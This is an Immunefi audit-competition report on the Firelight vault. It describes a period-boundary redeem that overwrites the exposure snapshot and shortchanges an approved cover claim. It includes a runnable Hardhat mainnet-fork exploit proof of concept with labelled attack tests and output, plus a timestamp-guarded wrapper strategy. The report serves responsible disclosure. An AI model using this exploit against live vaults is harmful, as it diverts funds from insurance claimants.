# 88353 sc high a vault exit mined in the first second of a period writes that period s own exposure snapshot permanently short paying an approved cover claim

**Submitted on Aug 12th 2026 at 20:33:27 UTC by @gzeon for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88353
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

`FirelightVault.payout()` bounds an incident claim by `totalAssetsAt(capturePeriodStart)`. Vault flows checkpoint `_traceTotalAssets` at key `block.timestamp` and the checkpoint lookup is inclusive of that key, so a `withdraw`/`redeem` mined in the first second of a period writes that period's opening snapshot itself. The exit is still bucketed into `withdrawAssets[capturePeriod + 1]`, which `payout()` treats as slashable, but the cap is now read after the exit rather than before it, so those assets can never be paid. An approved claim on that period is short by the exited amount and the payout window closes before it can be topped up. In the fork PoC below the same position, the same incident and the same approved assessment are run at three redeem timestamps. One second before the boundary and one second after it both distribute the full 60,168,000 FXRP. On the boundary the vault distributes 58,348,226.663082 FXRP and strands 1,819,773.336918 FXRP, and the approved claim is short 1,878,416.618968 FXRP against the accounting the code intends for a period-`C` exit.

## Vulnerability Details

`payout()` derives the covered period and its start from the capture timestamp, then caps the claim by the assets committed at that start:

```solidity
// FirelightVault.sol:900-927  (payout spans L892-966)
(uint256 capturePeriod, uint48 capturePeriodStart) = _periodAndStartAt(captureTimestamp);
...
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);            // L911
uint256 currentActiveAssets   = totalAssets();

// Withdrawals requested during the capture period are assigned to capturePeriod + 1
// and remain payable while payout is allowed.                                  L914-915
uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1];
...
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

`_periodAndStartAt` returns the exact boundary (`L1123-1128`), and the snapshot read is inclusive of it:

```solidity
function totalAssetsAt(uint48 timestamp) public view returns (uint256) {         // L456
    return _traceTotalAssets.upperLookupRecent(timestamp);   // L457, and Checkpoints.sol:218-224:
}                                                            // "last checkpoint with key lower or equal"
```

A withdrawal classifies itself by period number but records itself by wall clock:

```solidity
uint256 period = currentPeriod() + 1;                     // L1008: bucket C+1
...
uint48 ts = Time.timestamp();                             // L1051: ts = block.timestamp
...
if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets); // L1055
```

At `block.timestamp == T`, the first second of period `C`, those two disagree. `currentPeriod()` is already `C`, so the request lands in bucket `C + 1`, the bucket read at `L916` and folded into `activePayableAmount` at `L926`. But the checkpoint key is `T` itself, and `upperLookupRecent(T)` includes it, so the snapshot meant to record the state at the instant period `C` opened instead returns the state after this exit. The transaction counts as period-`C` activity when it is bucketed and as the period's opening balance when the cap is read.

`Checkpoints.Trace256.push` overwrites on an equal key (`Checkpoints.sol:198-210`) and OZ's `Trace208.push` reverts on a smaller one (`@openzeppelin/contracts/utils/structs/Checkpoints.sol:349-352`), so a successful withdrawal at `T` becomes the last checkpoint at or before `T`; no earlier entry can outrank it. Only a later vault flow in the same block, writing the same key `T`, would overwrite it again.

With vault request `Q`, active assets `A` before the exit and exited assets `X`, the shortfall is `min(Q, A) - min(Q, A - X)`, which equals `X` when `Q >= A` and `activePayableAmount` is not the binding cap. `Q >= A` is reachable because the enforced leverage ratio permits capacity up to five times collateral before divergence tolerance is applied: `effectiveLeverage <= MAX_LEVERAGE_FACTOR * minCAR` with `MAX_LEVERAGE_FACTOR = 5` (`CoverOrderAllocator.sol:82`, enforced at `L665-666`), against capacity `collateral * effectiveLeverage / minCAR`.

The shortfall cannot be topped up. `_isPeriodInPayoutWindow` (`L1131`) allows only `current == capturePeriod` or `capturePeriod + 1`; bucket `C + 1` becomes claimable at `C + 2` (`L791`), the moment that window shuts; and `IncidentManager.approveCurrentAssessment` closes the incident unconditionally after the single vault call (`IncidentManager.sol:423-434`, the `vault.payout` call at `L684`, `vaultPaidAmount` recorded at `L432`), so the approved claim cannot be re-approved for the remainder.

The live vault's period duration is `86400`s (`periodConfigurations(0) = {epoch: 1764682969, duration: 86400, startingPeriod: 0}`, read from the proxy), so `T` is a publicly computable timestamp once per day. Flare targets a 1.8-second block interval, so some integer timestamps carry no block. A staker holding shares through a wrapper that reverts unless `block.timestamp == T` retries across the boundary blocks each day, paying gas on the misses. An ordinary withdrawal triggers the same defect whenever it lands on a period boundary.

## Impact Details

**Capability delta:** holding vault shares lets an actor redeem and be slashed pro-rata. Landing that redeem on the period boundary additionally lets it keep 58,643,282,050 units that the rule the contract applies to its own transaction assigns to the incident claimant, and lowers the maximum the protocol can pay on that period's approved claim by 1,878,416,618,968. The exit is bucketed into `C+1` and stays slashable while the exposure cap is read after it, so redeeming alone grants neither effect.

Three arms, same position, same incident, same approved assessment, only the redeem timestamp differs. Integer FXRP units at 6 decimals:

| Redeem mined at                 | Paid to the payout receiver | Recovered by the exiting staker |      Total distributed |
| ------------------------------- | --------------------------: | ------------------------------: | ---------------------: |
| `T-1`, period `C-1`, bucket `C` |          58,289,583,381,032 |               1,878,416,618,968 |     60,168,000,000,000 |
| `T+1`, period `C`, bucket `C+1` |          60,168,000,000,000 |                               0 |     60,168,000,000,000 |
| **`T`, the boundary**           |      **58,289,583,381,032** |              **58,643,282,050** | **58,348,226,663,082** |

Either adjacent second distributes 60,168,000,000,000 in full. The boundary second distributes 58,348,226,663,082 and leaves 1,819,773,336,918 units in the vault, where they become redeemable value for the remaining stakers who did not earn them. Measured against the `T+1` accounting the code intends for an exit that `currentPeriod()` already places inside period `C`, the approved claim is short 1,878,416,618,968 units. `approveCurrentAssessment` closes the incident straight after the single `vault.payout` call (`IncidentManager.sol:423-434`, `L684`), so that assessment cannot be re-approved for the remainder. In FXRP that is 1,819,773.336918 redistributed and 1,878,416.618968 short, about $1,856,168.80 and $1,915,984.95 at an assumed $1.02 per XRP; the FXRP amounts are the primary quantity and the conversion is stated only for scale. At block 67251299 the vault held 58,289,583.381031 FXRP, and the run tops it up to the 60,168,000 FXRP deposit limit. That limit bounds this run rather than the general case, because rewards and direct transfers raise `totalAssets()` without passing the limit check. That figure and the 58,289,583.381032 snapshot differ by one integer unit because the redeem converts shares back to assets with ERC4626 flooring.

The correct baseline is `T+1`, not `T-1`. `T-1` is a different transaction in a different period; `T+1` is this transaction accounted for correctly. At `T` the contract sets `currentPeriod() == C`, assigns the request to bucket `C+1`, and documents that bucket as remaining payable while payout is allowed (`FirelightVault.sol:914-916`). The `T+1` arm is that same classification executed correctly, and it pays the actor nothing. The 58,643,282,050 units the actor collects at `T` therefore correspond to no entitlement under the rule the contract applies to it, and conservation shows where they come from: the claimant's 1,878,416,618,968 shortfall equals the actor's 58,643,282,050 plus the 1,819,773,336,918 that settles on the remaining stakers. That the actor is down on its original principal is a consequence of the incident, which destroys that position under every arm; its entitlement after the incident is zero and it receives 58,643,282,050.

The actor's return on the boundary exit is poor: the `T-1` exit would have recovered the whole 1,878,416,618,968. Under IMM-3 that is attacker financial risk, and under IMM-7 financial risk is a feasibility limitation that reduces the payout without changing the impact or severity. IMM-4 griefing does not apply, because it is defined for reports where the attacker gains no profit and this attacker takes 58,643,282,050 out of another user's approved claim.

The shortfall also arises with no actor at all whenever an ordinary withdrawal lands on a period boundary, given a claim large enough to saturate the cap and no later vault flow rewriting the key `T` checkpoint in the same block. That is the likely way the protocol meets it, and it costs the claimant the same 1,878,416,618,968.

Preconditions:

* **Normal starting privilege.** Holding vault shares. Any address can deposit; the run mints FXRP and deposits it through the ordinary path.
* **Required setup.** For deliberate use, holding those shares through a contract that reverts unless `block.timestamp == T`. `T` is public: `currentPeriodStart()` and `periodConfigurations(0)` are open view functions and the duration is a fixed 86,400s. Accidental triggering needs no setup.
* **Timing requirement.** Getting the redeem mined in the block whose timestamp is exactly `T`. Flare targets a 1.8-second interval, so some integer timestamps carry no block. The timestamp guard reverts an attempt included at any other timestamp, so a miss costs gas instead of forcing an unwanted exit, and the boundary recurs every 86,400s. The exited tranche is locked until `C+2`, so the same capital cannot retry the next day.

Exploit cost: 1,819,773.336918 FXRP of recovery forgone against the `T-1` exit, plus gas on each reverted guarded attempt. Under IMM-3 and IMM-7 this reduces the payout rather than the severity. No capital is borrowed. There is no flash loan, no market-depth dependency and no MEV component. Inclusion probability per boundary is the probability that a block carries timestamp `T` and includes the transaction. Repeatability is one success per tranche.

**Selected impact, named verbatim from the program's Critical list:** Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.

## References

* `contracts/core/FirelightVault.sol:892-966`: `payout()`; exposure cap at `L911`; slashable-bucket intent at `L914-916`, folded into `activePayableAmount` at `L926`
* `contracts/core/FirelightVault.sol:457`: the inclusive `upperLookupRecent` call
* `contracts/core/FirelightVault.sol:1008` vs `L1051`/`L1055`: bucket assignment vs. checkpoint key
* `contracts/core/FirelightVault.sol:1123-1128`, `L1131`: `_periodAndStartAt`, the payout-window condition
* `contracts/core/FirelightVault.sol:791`: `claimWithdraw` unlocks bucket `C+1` at `C+2`
* `contracts/core/lib/Checkpoints.sol:218-224`, `L198-210`: inclusive `upperLookupRecent`, equal-key overwrite
* `contracts/core/CoverOrderAllocator.sol:82`, enforced at `L665-666`: `MAX_LEVERAGE_FACTOR = 5`
* `contracts/core/IncidentManager.sol:423-434` and `L684`: `_executePayout` makes the single `vault.payout` call, then the incident closes
* `test/vault_payout.js:89-107`: the project's own test asserts the same cap from the deposit side
* Live vault proxy `0x4C18Ff3C89632c3Dd62E796c0aFA5c07c4c1B2b3` (Flare, chain id 14), `periodConfigurations(0).duration = 86400`
* In-scope impact claimed, named verbatim from the program list: "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield"

## Proof of Concept

## Proof of Concept

Flare mainnet fork at block 67251299. The live vault proxy is upgraded to the audited V2 implementation, the real `CoverOrderAllocator` and `IncidentManager` are deployed against it with production role wiring, a cover order is created, matched by Merkle commitment and settled, and an incident is captured, assessed and approved through `IncidentManager.approveCurrentAssessment`. `IncidentManager` is the intended `PAYOUT_ROLE` holder, so this is the production caller of `FirelightVault.payout`; the vault itself accepts the call from any `PAYOUT_ROLE` holder.

PoC environment class C. Four material test controls, all disclosed in the code, plus `hardhat_setBalance` to fund impersonated accounts and freshly generated signers with native gas: impersonating the ProxyAdmin owner `0xF811E83b45d8De67858eFA3aC1202A8B46B8d0b3` to run the upgrade and grant the V2 roles, which is the deployment step the program describes for this in-scope code; impersonating the FXRP asset manager `0x2a3Fe068cD92178554cabcf7c95ADf49B4B0B6A8` to mint the attacker's stake; and `setNextBlockTimestamp` to place the redeem on the boundary, which is the controlled variable. None of them touches the vault's own balances, share supply, checkpoint history or period schedule, all of which are the live values at the forked block. The attacker itself is an ordinary unprivileged EOA using `deposit`, `redeem` and `claimWithdraw`.

The three tests restore the same snapshot taken in the `before` hook, so the pre-state is identical and the redeem's block timestamp is the only difference. Baseline at `T-1`: the receiver is paid `58,289,583,381,032` and the staker recovers `1,878,416,618,968` from bucket `C`. Control at `T+1`: `withdrawAssets[C+1]` after the payout is `0` and the receiver is paid `60,168,000,000,000`. Attack at `T`: the same bucket holds `58,643,282,050` and the receiver is paid `58,289,583,381,032`. The exact integers come from the test assertions; the console lines round to two decimals.

`test/poc_fork_e2e.js` does not exist at `42f9ea5e`; save the block below to that path in a clean checkout before running.

### Run command

```
FORK=1 NODE_RPC_URL="$FLARE_RPC_URL" BN=67251299 HARDHAT_CHAIN_ID=14 npx hardhat test test/poc_fork_e2e.js
```

`$FLARE_RPC_URL` is any Flare mainnet archive RPC. Prepare the checkout once with `npm install && npx hardhat compile`; the repository's own `hardhat.config.js` turns `FORK=1` plus `BN` into a fork pinned at that block.

### PoC code

```javascript
const { time, takeSnapshot } = require("@nomicfoundation/hardhat-network-helpers");
const { ethers, upgrades } = require("hardhat");
const { StandardMerkleTree } = require("@openzeppelin/merkle-tree");
const { expect } = require("chai");

// End-to-end Flare mainnet fork PoC. The live Firelight vault proxy is upgraded to the audited V2
// implementation and the real CoverOrderAllocator + IncidentManager are deployed against it. A cover
// order is created, matched, and settled; an incident is then captured, assessed and approved
// through IncidentManager.approveCurrentAssessment. IncidentManager is the intended PAYOUT_ROLE
// holder, so that is the production caller of FirelightVault.payout.
//
//   FORK=1 NODE_RPC_URL="$FLARE_RPC_URL" BN=67251299 HARDHAT_CHAIN_ID=14 \
//     npx hardhat test test/poc_fork_e2e.js
//
// The three arms share one pre-state and differ only in the block timestamp of one staker's redeem:
// one second before the covered period opens, on the opening second, or one second after.

const VAULT = "0x4C18Ff3C89632c3Dd62E796c0aFA5c07c4c1B2b3";
const PROXY_ADMIN = "0x15f89292cef63405a53ab806966681ecb430df85";
const PROXY_ADMIN_OWNER = "0xF811E83b45d8De67858eFA3aC1202A8B46B8d0b3";
const FXRP = "0xad552a648c74d49e10027ab8a618a3ad4901c5be";
const FXRP_ASSET_MANAGER = "0x2a3Fe068cD92178554cabcf7c95ADf49B4B0B6A8";

const E18 = 10n ** 18n;
const PROTOCOL = "Morpho";
const MARKET = ethers.encodeBytes32String("market-A");
const abi = ethers.AbiCoder.defaultAbiCoder();

async function impersonate(a) {
  await ethers.provider.send("hardhat_impersonateAccount", [a]);
  await ethers.provider.send("hardhat_setBalance", [a, "0x3635C9ADC5DEA00000"]);
  return ethers.getSigner(a);
}
async function rnd() {
  const w = ethers.Wallet.createRandom().connect(ethers.provider);
  await ethers.provider.send("hardhat_setBalance", [w.address, "0x3635C9ADC5DEA00000"]);
  return w;
}
const fxrp = (v) => (Number(v) / 1e6).toLocaleString("en-US", { maximumFractionDigits: 2 });

describe("Flare fork E2E: live vault, real allocator, real IncidentManager", function () {
  let ctx, snap;

  before(async function () {
    if ((await ethers.provider.getNetwork()).chainId !== 14n) this.skip();

    const admin = await impersonate(PROXY_ADMIN_OWNER);
    const ops = await rnd();
    const buyer = await rnd();
    const attacker = await rnd();
    const payoutRecipient = await rnd();
    const payoutReceiver = await rnd();

    // Upgrade the live proxy to the audited V2 implementation.
    const implV2 = await (await ethers.getContractFactory("FirelightVault")).deploy();
    await implV2.waitForDeployment();
    await new ethers.Contract(PROXY_ADMIN, ["function upgradeAndCall(address,address,bytes) payable"], admin)
      .upgradeAndCall(VAULT, await implV2.getAddress(), implV2.interface.encodeFunctionData("initializeV2"));
    const vault = await ethers.getContractAt("FirelightVault", VAULT);
    expect(await vault.contractVersion()).to.equal(2n);

    // Supporting contracts. Empty first-loss buffer so the whole claim falls on the vault leg.
    const premium = await (await ethers.getContractFactory("MockERC20")).deploy("USDC", "USDC", 6);
    const flbWallet = await rnd();
    const priceFeed = await (await ethers.getContractFactory("MockAggregatorV3")).deploy(18, E18);
    const coverNFT = await upgrades.deployProxy(
      await ethers.getContractFactory("CoverNFT"),
      ["Firelight Cover", "FLCOVER", "", ops.address, ops.address, ethers.ZeroAddress, ethers.ZeroAddress],
      { kind: "transparent" },
    );

    const allocator = await upgrades.deployProxy(
      await ethers.getContractFactory("CoverOrderAllocator"),
      [{
        vault: VAULT,
        premiumCollector: (await rnd()).address,
        coverNFT: await coverNFT.getAddress(),
        priceFeedAdapter: await priceFeed.getAddress(),
        maxPriceAge: 7 * 24 * 3600,
        premiumTokens: [await premium.getAddress()],
        admin: ops.address, adminRole: ops.address, curatorRole: ops.address,
        allocatorRole: ops.address, configAdminRole: ops.address,
        initialProtocolConcentrations: [{ protocol: PROTOCOL, chainId: 1, maxProtocolConcentrationBps: 10000 }],
        newMarkets: [{ chainId: 1, protocol: PROTOCOL, market: MARKET }],
        capacityConfig: {
          minCAR: 12000, firstLossBufferToken: await premium.getAddress(),
          firstLossBuffer: flbWallet.address, effectiveLeverage: 60000, // 5x, the protocol's configured maximum
          minOrderMarketCoverAmount: 1, divergenceToleranceBps: 0,
        },
      }],
      { kind: "transparent", unsafeAllow: ["missing-initializer-call"] },
    );
    await coverNFT.connect(ops).grantRole(ethers.id("MINTER_ROLE"), await allocator.getAddress());

    const incidentManager = await upgrades.deployProxy(
      await ethers.getContractFactory("IncidentManager"),
      [ops.address, ops.address, ops.address, ops.address, ops.address, ops.address, ops.address, ops.address,
       payoutReceiver.address, await allocator.getAddress(), await priceFeed.getAddress(), 7 * 24 * 3600],
      { kind: "transparent" },
    );

    // Production role wiring: the IncidentManager holds PAYOUT_ROLE and INCIDENT_ROLE.
    const im = await incidentManager.getAddress();
    await vault.connect(admin).grantRole(await vault.PAYOUT_ROLE(), im);
    await vault.connect(admin).grantRole(await vault.INCIDENT_ROLE(), im);
    await vault.connect(admin).grantRole(await vault.PAYOUT_ALLOWLIST_ROLE(), admin.address);
    await vault.connect(admin).addToPayoutAllowlist(payoutReceiver.address);

    // Fund the attacker with real FXRP and stake it beside the live depositors.
    const fx = await ethers.getContractAt("IERC20", FXRP);
    const am = await impersonate(FXRP_ASSET_MANAGER);
    const liveAssets = await vault.totalAssets();
    const stake = (await vault.depositLimit()) - liveAssets;
    console.log("      live totalAssets @ block=", fxrp(liveAssets), "FXRP");
    await new ethers.Contract(FXRP, ["function mint(address,uint256)"], am).mint(attacker.address, stake);
    await fx.connect(attacker).approve(VAULT, stake);
    await vault.connect(attacker).deposit(stake, attacker.address);

    // Curator writes a cover order for the next period on the buyer's behalf.
    const COVER = 250_000_000n * E18; // 250,000,000 USD of cover, canonical 18dp, within the 5x capacity
    await allocator.connect(ops).createCoverOrder(
      buyer.address, payoutRecipient.address, "beneficiary", await premium.getAddress(),
      [{ marketId: ethers.keccak256(abi.encode(["uint64", "string", "bytes32"], [1, PROTOCOL, MARKET])),
         coverRateAnnual: 200, coverAmount: COVER }],
      0,
    );
    await premium.mint(buyer.address, 10n ** 12n);
    await premium.connect(buyer).approve(await allocator.getAddress(), 10n ** 12n);

    console.log("      live totalAssets + stake=", fxrp(await vault.totalAssets()), "FXRP");
    console.log("      attacker stake          =", fxrp(stake), "FXRP");
    console.log("      cover sold for period   =", (COVER / E18).toLocaleString("en-US"), "USD (5x leverage)");

    ctx = { vault, allocator, incidentManager, coverNFT, premium, fx, ops, buyer, attacker,
            payoutRecipient, payoutReceiver, stake, COVER,
            marketId: ethers.keccak256(abi.encode(["uint64", "string", "bytes32"], [1, PROTOCOL, MARKET])) };
    snap = await takeSnapshot();
  });

  afterEach(async () => { await snap.restore(); });

  // One staker exits at `periodStart + offset`; the cover is then settled, an incident captured in
  // that period is assessed for the full cover, and the consortium approves it.
  async function run(offset) {
    const { vault, allocator, incidentManager, premium, fx, ops, attacker, payoutRecipient,
            payoutReceiver, COVER, marketId } = ctx;

    const T = Number(await vault.currentPeriodEnd()); // first second of the covered period
    const shares = await vault.balanceOf(attacker.address);
    await time.setNextBlockTimestamp(T + offset);
    await vault.connect(attacker).redeem(shares, attacker.address, attacker.address);

    const P = await vault.currentPeriod();
    expect(Number(await vault.currentPeriodStart())).to.equal(T);

    // Matcher commits the tree and settles the order: premium is charged, the CoverNFT is minted.
    const tree = StandardMerkleTree.of([[0n, [[marketId, COVER]]]], ["uint256", "(bytes32,uint256)[]"]);
    await allocator.connect(ops).commitAllocation(P, tree.root, COVER, COVER);
    await allocator.connect(ops).settleCoverOrder(0n, [{ marketId, allocatedCover: COVER }], tree.getProof(0));
    expect(await ctx.coverNFT.ownerOf(0n)).to.equal(ctx.buyer.address);

    // A covered protocol is exploited in this period. Curator files it, assesses the full loss,
    // and the consortium approves. IncidentManager is the production caller of vault.payout().
    await incidentManager.connect(ops).createIncident(T, "market-A exploit", ethers.id("ref-1"));
    await incidentManager.connect(ops).confirmIncident(1n, "ipfs://report");
    await incidentManager.connect(ops).addAssessmentLosses(1n, [{ coverTokenId: 0n, marketId, amount: COVER }]);
    await incidentManager.connect(ops).submitCurrentAssessment(1n);

    const before = await fx.balanceOf(payoutReceiver.address);
    await incidentManager.connect(ops).approveCurrentAssessment(1n);
    const paid = (await fx.balanceOf(payoutReceiver.address)) - before;

    return { paid, snapshot: await vault.totalAssetsAt(T), bucket: await vault.withdrawAssets(P + 1n),
             period: P, T };
  }

  it("BASELINE: staker exits 1s BEFORE the period, bucket C is never slashed and they recover everything", async () => {
    const { vault, allocator, incidentManager, fx, ops, attacker, payoutReceiver, COVER, marketId } = ctx;

    // Exiting during period C-1 assigns the request to bucket C. A capture in period C only reaches
    // buckets C+1 and C+2, so this exit is outside the period's exposure entirely.
    const T = Number(await vault.currentPeriodEnd());
    const shares = await vault.balanceOf(attacker.address);
    await time.setNextBlockTimestamp(T - 1);
    await vault.connect(attacker).redeem(shares, attacker.address, attacker.address);
    const bucketC = (await vault.currentPeriod()) + 1n;

    await time.setNextBlockTimestamp(T + 1);
    await ethers.provider.send("evm_mine", []);
    const P = await vault.currentPeriod();
    expect(Number(await vault.currentPeriodStart())).to.equal(T);
    expect(P).to.equal(bucketC);

    const tree = StandardMerkleTree.of([[0n, [[marketId, COVER]]]], ["uint256", "(bytes32,uint256)[]"]);
    await allocator.connect(ops).commitAllocation(P, tree.root, COVER, COVER);
    await allocator.connect(ops).settleCoverOrder(0n, [{ marketId, allocatedCover: COVER }], tree.getProof(0));

    await incidentManager.connect(ops).createIncident(T, "market-A exploit", ethers.id("ref-1"));
    await incidentManager.connect(ops).confirmIncident(1n, "ipfs://report");
    await incidentManager.connect(ops).addAssessmentLosses(1n, [{ coverTokenId: 0n, marketId, amount: COVER }]);
    await incidentManager.connect(ops).submitCurrentAssessment(1n);
    const before = await fx.balanceOf(payoutReceiver.address);
    await incidentManager.connect(ops).approveCurrentAssessment(1n);
    const paid = (await fx.balanceOf(payoutReceiver.address)) - before;

    await time.increase(86400 * 2);
    const fxb = await fx.balanceOf(attacker.address);
    await vault.connect(attacker).claimWithdraw(bucketC);
    const walked = (await fx.balanceOf(attacker.address)) - fxb;

    console.log("      payout receiver got                =", fxrp(paid), "FXRP");
    console.log("      staker recovered from bucket C     =", fxrp(walked), "FXRP");
    // The staker keeps the whole position, so exiting one second earlier dominates the boundary exit.
    expect(paid).to.equal(58_289_583_381_032n);
    expect(walked).to.equal(ctx.stake - 1n);
    expect(paid + walked).to.equal(60_168_000_000_000n);
  });

  it("CONTROL: staker exits 1s into the period, the payout draws the whole period exposure", async () => {
    const r = await run(1);
    console.log("      totalAssetsAt(periodStart) =", fxrp(r.snapshot), "FXRP");
    console.log("      payout receiver got        =", fxrp(r.paid), "FXRP");
    console.log("      withdrawAssets[C+1] left   =", fxrp(r.bucket), "FXRP");
    // The cap saw the pre-exit exposure, so the payout takes all of it and the exiting
    // staker's bucket is slashed to nothing.
    expect(r.snapshot).to.equal(60_168_000_000_000n);
    expect(r.paid).to.equal(r.snapshot);
    expect(r.bucket).to.equal(0n);
  });

  it("ATTACK: staker exits ON the period boundary, the same approved claim is short", async () => {
    const attack = await run(0);

    // Two periods on, the boundary exit claims the residue the payout could not reach.
    await time.increase(86400 * 2);
    const fxb = await ctx.fx.balanceOf(ctx.attacker.address);
    await ctx.vault.connect(ctx.attacker).claimWithdraw(attack.period + 1n);
    const walked = (await ctx.fx.balanceOf(ctx.attacker.address)) - fxb;

    await snap.restore();
    const control = await run(1);

    console.log("      totalAssetsAt(periodStart) attack  =", fxrp(attack.snapshot), "FXRP");
    console.log("      totalAssetsAt(periodStart) control =", fxrp(control.snapshot), "FXRP");
    console.log("      withdrawAssets[C+1] (still held)   =", fxrp(attack.bucket), "FXRP");
    console.log("      claim paid, control                =", fxrp(control.paid), "FXRP");
    console.log("      claim paid, attack                 =", fxrp(attack.paid), "FXRP");
    console.log("      SHORTFALL on the approved claim    =", fxrp(control.paid - attack.paid), "FXRP");

    // Same order, same incident, same approved loss. Only the exit timestamp differed.
    expect(control.snapshot).to.equal(60_168_000_000_000n);
    expect(attack.snapshot).to.equal(58_289_583_381_032n);
    expect(control.paid).to.equal(60_168_000_000_000n);
    expect(attack.paid).to.equal(58_289_583_381_032n);
    expect(control.paid - attack.paid).to.equal(1_878_416_618_968n);

    // X^2/A survives in the bucket, and the exiting staker walks off with it at C+2 while the
    // payout receiver stays short. In the control that bucket is slashed to zero.
    console.log("      staker claimed at C+2              =", fxrp(walked), "FXRP");
    expect(attack.bucket).to.equal(58_643_282_050n);
    expect(walked).to.equal(attack.bucket);
    expect(control.bucket).to.equal(0n);
  });
});
```

### Captured output

```
  Flare fork E2E: live vault, real allocator, real IncidentManager
      live totalAssets @ block= 58,289,583.38 FXRP
      live totalAssets + stake= 60,168,000 FXRP
      attacker stake          = 1,878,416.62 FXRP
      cover sold for period   = 250,000,000 USD (5x leverage)
      payout receiver got                = 58,289,583.38 FXRP
      staker recovered from bucket C     = 1,878,416.62 FXRP
    ✔ BASELINE: staker exits 1s BEFORE the period, bucket C is never slashed and they recover everything (5636ms)
      totalAssetsAt(periodStart) = 60,168,000 FXRP
      payout receiver got        = 60,168,000 FXRP
      withdrawAssets[C+1] left   = 0 FXRP
    ✔ CONTROL: staker exits 1s into the period, the payout draws the whole period exposure (399ms)
      totalAssetsAt(periodStart) attack  = 58,289,583.38 FXRP
      totalAssetsAt(periodStart) control = 60,168,000 FXRP
      withdrawAssets[C+1] (still held)   = 58,643.28 FXRP
      claim paid, control                = 60,168,000 FXRP
      claim paid, attack                 = 58,289,583.38 FXRP
      SHORTFALL on the approved claim    = 1,878,416.62 FXRP
      staker claimed at C+2              = 58,643.28 FXRP
    ✔ ATTACK: staker exits ON the period boundary, the same approved claim is short (756ms)


  3 passing (27s)
```
